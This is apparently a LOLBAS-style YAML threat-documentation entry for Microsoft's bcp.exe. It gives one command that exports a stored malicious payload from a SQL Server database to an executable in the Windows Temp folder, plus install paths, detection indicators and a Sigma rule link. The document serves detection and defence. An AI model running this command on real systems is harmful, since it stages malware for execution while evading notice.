      document_utf8: "---\nName: Bcp.exe\nDescription: Microsoft SQL Server Bulk Copy Program utility\
        \ for importing and exporting data between SQL Server instances and data files.\nAuthor: Mahir\
        \ Ali Khan\nCreated: 2025-11-13\nCommands:\n  - Command: bcp \"SELECT payload_data FROM database.dbo.payloads\
        \ WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c\n    Description:\
        \ Export binary payload stored in SQL Server database to file system.\n    Usecase: Extract malicious\
        \ executable from database storage to local file system for execution.\n    Category: Download\n\
        \    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows\nFull_Path:\n  - Path:\
        \ C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe\n  - Path:\
        \ C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\bcp.exe\n  - Path:\
        \ C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\bcp.exe\n  - Path:\
        \ C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe\n\
        \  - Path: C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\\
        bcp.exe\n  - Path: C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\\
        Binn\\bcp.exe\n  - Path: C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\bcp.exe\n\
        Detection:\n  - IOC: Process creation of bcp.exe with queryout or Out parameter\n  - IOC: bcp.exe\
        \ writing executable files to temp or users directories\n  - IOC: Network connections from bcp.exe\
        \ to SQL Server followed by file creation\n  - IOC: Event ID 4688 - Process creation for bcp.exe\n\
        \  - IOC: Event ID 4663 - File system access by bcp.exe\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bcp_export_data.yml\n\
